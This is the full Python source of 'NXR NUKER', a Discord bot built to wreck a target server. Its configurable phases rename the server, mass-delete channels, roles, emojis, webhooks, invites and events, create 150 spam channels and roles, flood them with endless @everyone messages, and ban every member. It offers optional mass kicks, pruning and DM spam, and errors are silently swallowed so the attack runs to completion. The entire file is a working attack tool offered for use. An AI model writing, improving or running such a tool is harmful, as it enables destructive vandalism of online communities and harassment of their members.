# ═══════════════════════════════════════════════════════════
#  NXR NUKER  ·  by hea
#  pip install -r requirements.txt
#  python nxr_nuker.py
# ═══════════════════════════════════════════════════════════

import discord
import asyncio
import os
import sys
import time
import random
import string
import io
import json
import logging
from typing import Any, Awaitable, Callable, Iterable, Optional

# ═══════════════════════════════════════════════════════════
#                        CONFIG
# ═══════════════════════════════════════════════════════════

class Config:
    # ── auth ──
    TOKEN     = os.getenv("NXR_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
    GUILD_ID  = int(os.getenv("NXR_GUILD", "0"))

    # ── identity ──
    SERVER_NAME   = "NXR NUKER"
    CHANNEL_NAME  = "nxr-nuked"
    ROLE_NAME     = "NXR"
    WEBHOOK_NAME  = "NXR"
    REASON        = "NXR NUKER"

    # ── phases ──
    RENAME_SERVER     = True
    CHANGE_ICON       = False           # needs ICON_PATH file
    ICON_PATH         = "icon.png"

    DELETE_CHANNELS   = True
    DELETE_THREADS    = True
    DELETE_ROLES      = True
    DELETE_EMOJIS     = True
    DELETE_STICKERS   = True
    DELETE_INVITES    = True
    DELETE_WEBHOOKS   = True
    DELETE_EVENTS     = True

    CREATE_CHANNELS   = True
    CREATE_ROLES      = True
    CREATE_WEBHOOKS   = True

    SPAM_MESSAGES     = True
    SPAM_DMS          = False           # risky — slow
    BAN_ALL           = True
    KICK_ALL          = False
    PRUNE_MEMBERS     = False

    # ── counts ──
    CHANNEL_COUNT = 150
    ROLE_COUNT    = 150
    WEBHOOK_PER_CH = 1

    # ── text ──
    SPAM_TEXT = "@everyone **NXR NUKER** owns this server  ·  by hea"
    DM_TEXT   = "NXR NUKER — you got hit.  ·  by hea"

    # ── concurrency ──
    WORKERS      = 10
    BAN_WORKERS  = 45
    DM_WORKERS   = 15

    # ── misc ──
    COUNTDOWN  = 3
    LOG_FILE   = "nxr.log"

# ═══════════════════════════════════════════════════════════
#                        COLORS
# ═══════════════════════════════════════════════════════════

class Col:
    R  = "\033[0m"
    B  = "\033[1m"
    D  = "\033[2m"
    RD = "\033[91m"
    GR = "\033[92m"
    YL = "\033[93m"
    BL = "\033[94m"
    MG = "\033[95m"
    CY = "\033[96m"
    WH = "\033[97m"
    GY = "\033[90m"

# ═══════════════════════════════════════════════════════════
#                        BANNER
# ═══════════════════════════════════════════════════════════

BANNER = f"""{Col.CY}{Col.B}
    ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
    ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Col.R}{Col.D}{Col.GY}              ─────────────  by {Col.R}{Col.B}{Col.MG}hea{Col.R}{Col.D}{Col.GY}  ─────────────{Col.R}
"""

# ═══════════════════════════════════════════════════════════
#                        LOGGER
# ═══════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    handlers=[logging.FileHandler(Config.LOG_FILE, encoding="utf-8")],
)
_log = logging.getLogger("nxr")

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def log(tag: str, msg: str, color: str = Col.CY):
    line = f"{Col.GY}[{Col.B}{color}{tag}{Col.R}{Col.GY}]{Col.R} {msg}"
    print(line, flush=True)
    _log.info(f"[{tag}] {msg}")

def hr():
    print(f"{Col.GY}{'─' * 62}{Col.R}")

# ═══════════════════════════════════════════════════════════
#                        HELPERS
# ═══════════════════════════════════════════════════════════

RETRYABLE = (asyncio.TimeoutError, ConnectionError, OSError)

async def safe(coro_fn: Callable[[], Awaitable[Any]],
               retries: int = 2) -> Optional[Any]:
    """Never raises. Retries on 5xx / network errors. Swallows 4xx."""
    for attempt in range(retries + 1):
        try:
            return await coro_fn()
        except discord.Forbidden:
            return None
        except discord.NotFound:
            return None
        except discord.HTTPException as e:
            if 500 <= getattr(e, "status", 0) < 600 and attempt < retries:
                await asyncio.sleep(0.4 * (attempt + 1))
                continue
            return None
        except RETRYABLE:
            if attempt < retries:
                await asyncio.sleep(0.4 * (attempt + 1))
                continue
            return None
        except asyncio.CancelledError:
            raise
        except Exception:
            return None

async def pool(items: Iterable, worker: Callable, limit: int) -> list:
    """Bounded-concurrency map with full exception safety."""
    items = list(items)
    sem = asyncio.Semaphore(limit)
    results = [None] * len(items)

    async def _run(i: int, x):
        async with sem:
            results[i] = await worker(x)

    await asyncio.gather(*[_run(i, x) for i, x in enumerate(items)],
                         return_exceptions=True)
    return results

def randstr(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ═══════════════════════════════════════════════════════════
#                        NUKER
# ═══════════════════════════════════════════════════════════

class Nuker:
    def __init__(self, guild: discord.Guild):
        self.g = guild
        self.t0 = time.time()
        self.stats = {}

    # ── phase 1 : rename + icon ─────────────────────────
    async def phase_identity(self):
        log("PH1", "identity  ·  rename + icon", Col.MG)
        if Config.RENAME_SERVER:
            ok = await safe(lambda: self.g.edit(name=Config.SERVER_NAME,
                                                reason=Config.REASON))
            log("OK ", f"renamed  →  {Col.YL}{Config.SERVER_NAME}{Col.R}", Col.GR)

        if Config.CHANGE_ICON and os.path.isfile(Config.ICON_PATH):
            with open(Config.ICON_PATH, "rb") as f:
                data = f.read()
            await safe(lambda: self.g.edit(icon=data, reason=Config.REASON))
            log("OK ", "icon changed", Col.GR)

    # ── phase 2 : destroy ───────────────────────────────
    async def phase_destroy(self):
        log("PH2", "destroy  ·  channels / roles / emojis / stickers", Col.RD)
        g = self.g

        # channels + threads
        if Config.DELETE_CHANNELS:
            channels = list(g.channels)

            if Config.DELETE_THREADS:
                threads = []
                for ch in channels:
                    threads.extend(getattr(ch, "threads", []) or [])
                if threads:
                    await pool(threads,
                               lambda t: safe(lambda: t.delete()),
                               Config.WORKERS)
                    log("DEL", f"threads    x{len(threads)}", Col.RD)

            await pool(channels,
                       lambda c: safe(lambda: c.delete()),
                       Config.WORKERS)
            log("DEL", f"channels   x{len(channels)}", Col.RD)

        # roles
        if Config.DELETE_ROLES:
            roles = [r for r in g.roles
                     if r != g.default_role and not r.managed]
            await pool(roles,
                       lambda r: safe(lambda: r.delete()),
                       Config.WORKERS)
            log("DEL", f"roles      x{len(roles)}", Col.RD)

        # emojis
        if Config.DELETE_EMOJIS:
            emojis = list(g.emojis)
            if emojis:
                await pool(emojis,
                           lambda e: safe(lambda: e.delete()),
                           Config.WORKERS)
            log("DEL", f"emojis     x{len(emojis)}", Col.RD)

        # stickers
        if Config.DELETE_STICKERS:
            stickers = list(g.stickers)
            if stickers:
                await pool(stickers,
                           lambda s: safe(lambda: s.delete()),
                           Config.WORKERS)
            log("DEL", f"stickers   x{len(stickers)}", Col.RD)

        # webhooks (existing)
        if Config.DELETE_WEBHOOKS:
            try:
                hooks = [w async for w in g.webhooks()]
            except Exception:
                hooks = []
            if hooks:
                await pool(hooks,
                           lambda w: safe(lambda: w.delete()),
                           Config.WORKERS)
            log("DEL", f"webhooks   x{len(hooks)}", Col.RD)

        # invites
        if Config.DELETE_INVITES:
            try:
                invs = [i async for i in g.invites()]
            except Exception:
                invs = []
            if invs:
                await pool(invs,
                           lambda i: safe(lambda: i.delete()),
                           Config.WORKERS)
            log("DEL", f"invites    x{len(invs)}", Col.RD)

        # scheduled events
        if Config.DELETE_EVENTS:
            events = list(g.scheduled_events)
            if events:
                await pool(events,
                           lambda e: safe(lambda: e.delete()),
                           Config.WORKERS)
            log("DEL", f"events     x{len(events)}", Col.RD)

    # ── phase 3 : create ────────────────────────────────
    async def phase_create(self):
        log("PH3", "create  ·  channels / roles / webhooks", Col.CY)
        g = self.g
        new_channels = []

        if Config.CREATE_CHANNELS:
            async def make_ch(_):
                return await safe(lambda: g.create_text_channel(
                    name=Config.CHANNEL_NAME, reason=Config.REASON))

            new_channels = [c for c in
                            await pool(range(Config.CHANNEL_COUNT),
                                       make_ch, Config.WORKERS)
                            if isinstance(c, discord.TextChannel)]
            log("NEW", f"channels   x{len(new_channels)}", Col.CY)

        if Config.CREATE_ROLES:
            async def make_role(_):
                return await safe(lambda: g.create_role(
                    name=Config.ROLE_NAME, reason=Config.REASON))

            roles = await pool(range(Config.ROLE_COUNT),
                               make_role, Config.WORKERS)
            roles = [r for r in roles if r]
            log("NEW", f"roles      x{len(roles)}", Col.CY)

        if Config.CREATE_WEBHOOKS and new_channels:
            async def make_hook(ch):
                for _ in range(Config.WEBHOOK_PER_CH):
                    await safe(lambda: ch.create_webhook(
                        name=Config.WEBHOOK_NAME, reason=Config.REASON))

            await pool(new_channels, make_hook, Config.WORKERS)
            log("NEW", f"webhooks   x{len(new_channels) * Config.WEBHOOK_PER_CH}",
                Col.CY)

        return new_channels

    # ── phase 4 : spam messages ─────────────────────────
    async def phase_spam(self, channels):
        if not Config.SPAM_MESSAGES or not channels:
            return
        log("PH4", "spam  ·  messages", Col.CY)

        async def send(ch):
            # keep posting until cancelled or channel dies
            while True:
                r = await safe(lambda: ch.send(Config.SPAM_TEXT))
                if r is None:
                    return
                await asyncio.sleep(0.6)

        # run forever in background
        for ch in channels:
            asyncio.create_task(send(ch))

        log("OK ", f"spam running on x{len(channels)}", Col.GR)

    # ── phase 5 : ban / kick / prune ────────────────────
    async def phase_members(self):
        g = self.g

        if Config.BAN_ALL:
            log("PH5", "ban  ·  everyone", Col.RD)
            members = [m for m in g.members
                       if m.id != g.me.id and not m.bot is False or True]
            # include bots too; exclude self
            members = [m for m in g.members if m.id != g.me.id]

            async def do_ban(m):
                return await safe(lambda: m.ban(
                    reason=Config.REASON, delete_message_seconds=0))

            await pool(members, do_ban, Config.BAN_WORKERS)
            log("BAN", f"members    x{len(members)}", Col.RD)

        elif Config.KICK_ALL:
            log("PH5", "kick  ·  everyone", Col.RD)
            members = [m for m in g.members if m.id != g.me.id]

            async def do_kick(m):
                return await safe(lambda: m.kick(reason=Config.REASON))

            await pool(members, do_kick, Config.BAN_WORKERS)
            log("KIK", f"members    x{len(members)}", Col.RD)

        if Config.PRUNE_MEMBERS:
            await safe(lambda: g.prune_members(
                days=7, reason=Config.REASON))
            log("PRN", "prune      requested", Col.YL)

        if Config.SPAM_DMS:
            log("PH5", "dm  ·  everyone", Col.YL)
            members = [m for m in g.members
                       if m.id != g.me.id and not m.bot]

            async def do_dm(m):
                ch = await safe(lambda: m.create_dm())
                if ch:
                    await safe(lambda: ch.send(Config.DM_TEXT))

            await pool(members, do_dm, Config.DM_WORKERS)
            log("DM ", f"members    x{len(members)}", Col.YL)

    # ── orchestrator ────────────────────────────────────
    async def run(self):
        hr()
        log("NXR", f"target  ·  {Col.WH}{self.g.name}{Col.R}  "
                   f"{Col.GY}({self.g.id}){Col.R}", Col.MG)
        hr()

        await self.phase_identity()
        await self.phase_destroy()
        new_ch = await self.phase_create()
        await self.phase_spam(new_ch)
        await self.phase_members()

        dt = time.time() - self.t0
        hr()
        log("NXR", f"complete in {Col.B}{Col.MG}{dt:.2f}s{Col.R}", Col.MG)
        hr()

# ═══════════════════════════════════════════════════════════
#                        BOT
# ═══════════════════════════════════════════════════════════

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.guild_messages = True
intents.guild_reactions = True
intents.voice_states = True

bot = discord.Client(intents=intents)
_run_once = False

@bot.event
async def on_ready():
    global _run_once
    clear()
    if os.name == "nt":
        os.system("title NXR NUKER")
    print(BANNER)
    log("NXR", f"logged in  ·  {Col.CY}{Col.B}{bot.user}{Col.R}  "
               f"{Col.GY}({bot.user.id}){Col.R}", Col.MG)

    if _run_once:
        return
    _run_once = True

    # countdown
    for i in range(Config.COUNTDOWN, 0, -1):
        log("...", f"starting in {Col.YL}{i}{Col.R}", Col.YL)
        await asyncio.sleep(1)

    guild = bot.get_guild(Config.GUILD_ID)
    if not guild:
        log("ERR", f"guild {Config.GUILD_ID} not found  ·  "
                   f"bot must be in server", Col.RD)
        return

    await Nuker(guild).run()

@bot.event
async def on_error(event, *args, **kwargs):
    # never crash the loop
    return

# ═══════════════════════════════════════════════════════════
#                        MAIN
# ═══════════════════════════════════════════════════════════

def main():
    if Config.TOKEN.startswith("PUT_"):
        clear()
        print(BANNER)
        log("ERR", "set your TOKEN in Config or NXR_TOKEN env", Col.RD)
        sys.exit(1)
    if not Config.GUILD_ID:
        clear()
        print(BANNER)
        log("ERR", "set GUILD_ID in Config or NXR_GUILD env", Col.RD)
        sys.exit(1)
    try:
        bot.run(Config.TOKEN, log_handler=None)
    except discord.LoginFailure:
        log("ERR", "invalid bot token", Col.RD)
    except KeyboardInterrupt:
        log("NXR", "aborted by user", Col.YL)

if __name__ == "__main__":
    main()
